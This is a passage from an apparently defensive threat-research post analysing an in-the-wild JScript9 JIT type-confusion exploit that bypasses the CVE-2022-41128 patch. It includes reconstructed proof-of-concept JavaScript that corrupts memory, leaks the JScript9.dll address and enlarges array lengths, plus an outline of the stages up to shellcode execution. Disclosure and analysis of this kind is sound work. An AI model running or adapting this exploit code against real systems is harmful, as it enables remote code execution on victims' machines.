b">ValueType::IsUninitialized</code> is related to the usual arithmetic conversion. Arithmetic conversions match types when two operands have different types. By default, implicit type casting is performed by these arithmetic conversions for all operations, with the exception that the operands do not need to be type-matched for incremental (++, -) and bitwise (&lt;&lt;, &gt;&gt;, &amp;, ^ …) operations.</p><p id="0ba0" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">For this reason, when passing a variable initialized with an increment or decrement, or bitwise operation, the <code class="cx qy qz ra rb b">ValueType::IsUninitialized</code> function will assume that it is a variable that does not require arithmetic conversion and return False, skipping the call to the <code class="cx qy qz ra rb b">IR::Opnd::SetValueType</code> function to validate the type for casting, causing type confusion.</p><p id="8f83" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The reconstructed PoC code based on the attacker’s payload obtained in this attack is shown below.</p><pre class="qi qj qk ql qm rc rb rd bp re bb bk"><span id="f972" class="rf nz gu rb b bg rg rh l ri rj">&lt;script&gt;<br/>    function foo() {<br/>        g = new ArrayBuffer(1400);<br/>        d = new Int32Array(g);<br/>        var j = 1;<br/>        var e = new Object({<br/>            a: 1,<br/>            b: 2,  <br/>            c: &quot;3&quot;,<br/>            d: 0x414141,    // Write at 0x414141<br/>            e: 5,<br/>        });<br/>        function boom(m) {<br/>            var q = d;<br/>            var l = q[0];<br/>            for (var o = 0; o &lt; 1; o++) {<br/>                if (m) {<br/>                    for (var n = 0; n &lt; 1; n++) {<br/>                        j++;     // bypassing CVE-2022-41128 patch<br/>                        q = j;   <br/>                        break;<br/>                    }<br/>                    if(m){<br/>                        q = e;   // Confused <br/>                    }<br/>                    q[-1] = 1;<br/>                }<br/>            }<br/>            if(m){<br/>                q[8] = 0x42424242; // Write 0x42424242<br/>            }<br/>        }<br/>        for (let h = 0; h &lt; 100000; h++) {<br/>            boom(false);<br/>        }<br/>        boom(true);<br/>    }<br/>    foo();<br/>&lt;/script&gt;</span></pre><p id="9d54" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">By exploiting the fact that the JIT compiler skips type validation of variables initialized with the usual arithmetic conversion exception operator, an attacker could bypass the security patch in CVE-2022-41128 by simply adding code that declares the variable <code class="cx qy qz ra rb b">j</code> and assigns it <code class="cx qy qz ra rb b">q</code> via increment operator in the existing proof of concept for CVE-2022-41128.</p><p id="0a58" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">Accessing <code class="cx qy qz ra rb b">q</code>, which has been changed to an Object type through the Int32Array’s array indexing method, can trigger Type Confusion, allowing arbitrary manipulation of the value of the address pointed to by the object’s property value.</p><p id="545e" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The following are the debugging results for the <code class="cx qy qz ra rb b">q[8] = 0x42424242</code> code snippet during the PoC, comparing the machine code generated by the JIT compiler under normal behavior with the machine code generated due to the vulnerability. When the JIT compiler adds the type validation code, it calls the <code class="cx qy qz ra rb b">JavascriptOperators::OP_SetElementI_JIT</code> function.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*TitdMy1pf2WZ_AsdM7y6wg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*TitdMy1pf2WZ_AsdM7y6wg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*TitdMy1pf2WZ_AsdM7y6wg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*TitdMy1pf2WZ_AsdM7y6wg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*TitdMy1pf2WZ_AsdM7y6wg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*TitdMy1pf2WZ_AsdM7y6wg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*TitdMy1pf2WZ_AsdM7y6wg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*TitdMy1pf2WZ_AsdM7y6wg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*TitdMy1pf2WZ_AsdM7y6wg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*TitdMy1pf2WZ_AsdM7y6wg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*TitdMy1pf2WZ_AsdM7y6wg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*TitdMy1pf2WZ_AsdM7y6wg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*TitdMy1pf2WZ_AsdM7y6wg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*TitdMy1pf2WZ_AsdM7y6wg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="264" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 2. Machine code generated by the JIT compiler during normal operation</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="8a1c" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The optimized machine code caused by the vulnerability removes the routine calling <code class="cx qy qz ra rb b">JavascriptOperators::OP_SetElementI_JIT</code> and accesses the address <code class="cx qy qz ra rb b">0x414161 (0x414141 + 4 * 8)</code>, which is the calculated offset of <code class="cx qy qz ra rb b">q[8]</code>, without type validation, to write <code class="cx qy qz ra rb b">0x42424242</code>.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*64LTa-pL43ViyjaJ3cmKXg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*64LTa-pL43ViyjaJ3cmKXg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*64LTa-pL43ViyjaJ3cmKXg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*64LTa-pL43ViyjaJ3cmKXg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*64LTa-pL43ViyjaJ3cmKXg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*64LTa-pL43ViyjaJ3cmKXg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*64LTa-pL43ViyjaJ3cmKXg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*64LTa-pL43ViyjaJ3cmKXg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*64LTa-pL43ViyjaJ3cmKXg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*64LTa-pL43ViyjaJ3cmKXg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*64LTa-pL43ViyjaJ3cmKXg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*64LTa-pL43ViyjaJ3cmKXg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*64LTa-pL43ViyjaJ3cmKXg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*64LTa-pL43ViyjaJ3cmKXg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="316" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 3. Vulnerable machine code generated by incorrect JIT engine assumptions</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="1cf7" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The subsequent exploit steps are identical to the previously disclosed CVE-2022-41128, suggesting that the vulnerability was quickly weaponized after bypassing the patch.</p><h2 id="1d76" class="pk nz gu bf oa pl pm dy oe pn po ea oi nh pp pq pr nl ps pt pu np pv pw px py bk">3. Exploit Analysis</h2><p id="4fd0" class="pw-post-body-paragraph mw mx gu my b mz ow nb nc nd ox nf ng nh oy nj nk nl oz nn no np pa nr ns nt gn bk">We verified the actual exploit configuration and found that it exploits vulnerabilities related to type validation and memory management in the just-in-time (JIT) compiler to execute arbitrary code. In addition, a separate PoC was configured and analyzed on an <strong class="my gv">affected version of Windows environment*</strong> (Windows 11 23H2 build 22631.3880) to verify the possibility of remote code execution due to type confusion. The exploitation process can be summarized in four steps.</p><ol class=""><li id="2f5c" class="mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt rl pd pe bk"><strong class="my gv">(Stage 1) Obtain Relative Read/Write Primitive<br/></strong>Leak the JScript9.dll address and VirtualProtect function address through vtable and modify the Length property value of an arbitrary Array object to a large value to obtain a Relative Read/Write primitive of sufficient size.</li><li id="c78e" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt rl pd pe bk"><strong class="my gv">(Stage 2) Obtain Arbitrary Read/Write Primitive<br/></strong>Using Relative R/W, manipulate the DataView object method call arguments to obtain an Arbitrary R/W primitive.</li><li id="e465" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt rl pd pe bk"><strong class="my gv">(Stage 3) Configure Fake Vftable and Fake Object<br/></strong>Construct a fake literal string object with Arbitrary R/W and configure the literal string method to reference the fake object.</li><li id="75c6" class="mw mx gu my b mz pf nb nc nd pg nf ng nh ph nj nk nl pi nn no np pj nr ns nt rl pd pe bk"><strong class="my gv">(Stage 4) Reference the Fake Object and Execute the Shellcode<br/></strong>When the literal string method is called, the VirtualProtect function and shellcode of the fake vftable are called to execute arbitrary code.</li></ol><p id="1795" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">* See <strong class="my gv">Appendix B. Affected Windows Versions</strong> for a list of affected Windows versions other than these versions.</p><p id="02cc" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk"><strong class="my gv">3.1 Stage 1 — Obtain Relative Read/Write Primitive</strong></p><p id="3d77" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The PoC code to perform step 1 is shown below.</p><pre class="qi qj qk ql qm rc rb rd bp re bb bk"><span id="76b9" class="rf nz gu rb b bg rg rh l ri rj">var b = new Array(256)<br/>function foo() {<br/>    g = new ArrayBuffer(1400);<br/>    d = new Int32Array(g);<br/>    var j = 1;<br/><br/><br/>    for (var k = 0; k &lt; 256; k++) {<br/>        b[k] = new Array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15);<br/>    }<br/>   <br/>    var e = new Object({<br/>        a: 1,<br/>        b: 2,<br/>        c: &quot;3&quot;,<br/>        d: b[52],   // Get relative R/W using b[52]<br/>        e: 5,<br/>    });<br/><br/><br/>    function boom(m) {<br/>// ... Triggering Bug<br/>        if(p){<br/>            q[8] = 0x1fffffff;  // Array Length<br/>            q[21] = 0x1fffffff; // Array Actual Length<br/>            q[22] = 0x1fffffff; // Buffer Length<br/>           <br/>            jscript9_base.addr_low = q[0] - 0x395f98;<br/>            jscript9_base.addr_high = q[1];<br/>        }<br/>    }<br/>    for (let h = 0; h &lt; 10000; h++) {<br/>        boom(false);<br/>    }<br/>    boom(true);<br/>}<br/>foo();</span></pre><p id="0ae0" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The typed array, <code class="cx qy qz ra rb b">Int32Array</code>, accesses the array content by referencing a pointer at offset 0x38.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*nuZ33mAsSsl4c9FqY8SQEQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*nuZ33mAsSsl4c9FqY8SQEQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*nuZ33mAsSsl4c9FqY8SQEQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*nuZ33mAsSsl4c9FqY8SQEQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*nuZ33mAsSsl4c9FqY8SQEQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*nuZ33mAsSsl4c9FqY8SQEQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*nuZ33mAsSsl4c9FqY8SQEQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*nuZ33mAsSsl4c9FqY8SQEQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*nuZ33mAsSsl4c9FqY8SQEQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*nuZ33mAsSsl4c9FqY8SQEQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*nuZ33mAsSsl4c9FqY8SQEQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*nuZ33mAsSsl4c9FqY8SQEQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*nuZ33mAsSsl4c9FqY8SQEQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*nuZ33mAsSsl4c9FqY8SQEQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="781" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 4. Int32Array Memory Structure</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="e955" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">The machine code generated by the weak assumption thinks that the Object <code class="cx qy qz ra rb b">q</code> is still an <code class="cx qy qz ra rb b">Int32Array</code> and allows an approach with an array index like <code class="cx qy qz ra rb b">q[0]</code>, referencing the address of the <code class="cx qy qz ra rb b">b[52]</code> Array object at Object <code class="cx qy qz ra rb b">q</code> offset 0x38. For this reason, it is possible to read or write arbitrary property values of the <code class="cx qy qz ra rb b">b[52]</code> object.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*vYcEALtNmWcjuvOv7vXVQQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*vYcEALtNmWcjuvOv7vXVQQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*vYcEALtNmWcjuvOv7vXVQQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*vYcEALtNmWcjuvOv7vXVQQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*vYcEALtNmWcjuvOv7vXVQQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*vYcEALtNmWcjuvOv7vXVQQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*vYcEALtNmWcjuvOv7vXVQQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*vYcEALtNmWcjuvOv7vXVQQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*vYcEALtNmWcjuvOv7vXVQQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*vYcEALtNmWcjuvOv7vXVQQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*vYcEALtNmWcjuvOv7vXVQQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*vYcEALtNmWcjuvOv7vXVQQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*vYcEALtNmWcjuvOv7vXVQQ.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*vYcEALtNmWcjuvOv7vXVQQ.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="556" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 5. Referencing Object q as an Int32Array due to type confusion</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="c4bd" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">JScript9.dll address can be leaked by reading the vftable with <code class="cx qy qz ra rb b">q[0]</code>, <code class="cx qy qz ra rb b">q[1]</code>, the first 8 bytes of <code class="cx qy qz ra rb b">b[52]</code>. The exploit later uses this to leak the <code class="cx qy qz ra rb b">VirtualProtect</code> address for shellcode execution. In this case, 8 bytes are read through two array indices because the original type of <code class="cx qy qz ra rb b">q</code>, <code class="cx qy qz ra rb b">Int32Array</code>, handles 32-bit Integer data, which is calculated in 4-byte increments when accessing the array index.<br/> After the vftable leak <code class="cx qy qz ra rb b">b[52].length</code> is tampered with to <code class="cx qy qz ra rb b">0x1fffffff</code> go through <code class="cx qy qz ra rb b">q[8]</code>, <code class="cx qy qz ra rb b">q[21]</code>, and <code class="cx qy qz ra rb b">q[22]</code>.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><figure class="qi qj qk ql qm pz qn qo paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><div class="qf qg rk"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*fPzw7OrpPfXxYtV5quATiA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*fPzw7OrpPfXxYtV5quATiA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*fPzw7OrpPfXxYtV5quATiA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*fPzw7OrpPfXxYtV5quATiA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*fPzw7OrpPfXxYtV5quATiA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*fPzw7OrpPfXxYtV5quATiA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*fPzw7OrpPfXxYtV5quATiA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*fPzw7OrpPfXxYtV5quATiA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*fPzw7OrpPfXxYtV5quATiA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*fPzw7OrpPfXxYtV5quATiA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*fPzw7OrpPfXxYtV5quATiA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*fPzw7OrpPfXxYtV5quATiA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*fPzw7OrpPfXxYtV5quATiA.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*fPzw7OrpPfXxYtV5quATiA.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"/><img alt="" class="bh md qt c" width="1000" height="583" loading="eager" role="presentation"/></picture></div></div><figcaption class="qu ff qv qf qg qw qx bf b bg z du">Figure 6.<code class="cx qy qz ra rb b"> b[52]</code> Array’s Length property tampered with and JScript9.dll address exfiltrated</figcaption></figure></div></div></div><div class="ab cb"><div class="ci bh fz ga gb gc"><p id="2890" class="pw-post-body-paragraph mw mx gu my b mz na nb nc nd ne nf ng nh ni nj nk nl nm nn no np nq nr ns nt gn bk">By overwriting <code class="cx qy qz ra rb b">b[52].length</code> with <code class="cx qy qz ra rb b">0x1ffffff</code>, we have access to <code class="cx qy qz ra rb b">b[52][0x0]</code> through <code class="cx qy qz ra rb b">b[52][0x1fffffff]</code>, giving us a Relative Read/Write primitive of sufficient size to exploit.</p></div></div><div class="pz"><div class="ab cb"><div class="ly qa lz qb ma qc cf qd cg qe ci bh"><div class="qi qj qk ql qm ab kv"><figure class="lu pz rm rn qn qo ro paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*XdW77MNd9x1WB1Mg8jMt-g.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*XdW77MNd9x1WB1Mg8jMt-g.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*XdW77MNd9x1WB1Mg8jMt-g.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*XdW77MNd9x1WB1Mg8jMt-g.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*XdW77MNd9x1WB1Mg8jMt-g.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*XdW77MNd9x1WB1Mg8jMt-g.png 1100w, https://miro.medium.com/v2/resize:fit:1004/format:webp/1*XdW77MNd9x1WB1Mg8jMt-g.png 1004w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 502px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*XdW77MNd9x1WB1Mg8jMt-g.png 640w, https://miro.medium.com/v2/resize:fit:720/1*XdW77MNd9x1WB1Mg8jMt-g.png 720w, https://miro.medium.com/v2/resize:fit:750/1*XdW77MNd9x1WB1Mg8jMt-g.png 750w, https://miro.medium.com/v2/resize:fit:786/1*XdW77MNd9x1WB1Mg8jMt-g.png 786w, https://miro.medium.com/v2/resize:fit:828/1*XdW77MNd9x1WB1Mg8jMt-g.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*XdW77MNd9x1WB1Mg8jMt-g.png 1100w, https://miro.medium.com/v2/resize:fit:1004/1*XdW77MNd9x1WB1Mg8jMt-g.png 1004w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 502px"/><img alt="" class="bh md qt c" width="502" height="370" loading="eager" role="presentation"/></picture></div></figure><figure class="lu pz rp rn qn qo ro paragraph-image"><div role="button" tabindex="0" class="qp qq fj qr bh qs"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*VeO80D-fq24_oLUUcIC26w.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*VeO80D-fq24_oLUUcIC26w.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*VeO80D-fq24_oLUUcIC26w.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*VeO80D-fq24_oLUUcIC26w.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*VeO80D-fq24_oLUUcIC26w.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*VeO80D-fq24_oLUUcIC26w.png 1100w, https://miro.medium.com/v2/resize:fit:998/format:webp/1*VeO80D-fq24_oLUUcIC26w.png 998w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) 